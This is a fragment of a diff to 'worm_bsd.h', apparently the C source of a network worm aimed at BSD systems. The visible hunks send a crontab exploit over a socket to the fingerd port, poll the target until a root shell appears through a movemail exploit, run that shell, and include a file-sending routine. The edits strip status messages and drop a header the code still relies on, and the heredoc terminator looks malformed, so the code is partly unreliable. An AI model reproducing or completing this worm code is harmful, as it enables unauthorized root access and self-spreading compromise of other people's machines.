@@ -6,7 +6,6 @@ cat > worm_bsd.h << 'EOF'
 #include <sys/time.h>
 #include <netinet/in.h>
 #include <stdio.h>
-#include <string.h>
 
 #define FINGERD_PORT 79
 
@@ -137,17 +136,13 @@ get_root_shell_via_movemail_exploit(sock, io_buf, buf_size)
 	write_to_sock(sock, CRONTAB_EXPLOIT);
 
 	do {
-        write_to_sock(sock, CHECK_FOR_SHELL);
-        read_from_sock(sock, io_buf, buf_size);
-        
-        printf("[*] Polling shell status. Target replied: %s\n", io_buf);
-        
-        sleep(10);
-        
-    } while (strstr(io_buf, NOT_FOUND) != NULL);
+		write_to_sock(sock, CHECK_FOR_SHELL);
+		read_from_sock(sock, io_buf, buf_size);
+		
+		sleep(10);
+	} while (!strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)));
 
-    printf("[*] Success! Shell found. Executing...\n");
-    write_to_sock(sock, RUN_SHELL);
+	write_to_sock(sock, RUN_SHELL);
 }	
 
 int send_int(num, fd)
@@ -259,5 +254,6 @@ int send_files(client_sock, files, num_files, file_buf, buf_size)
 	return 0;
 }
 #endif
+
 
 'EOF'
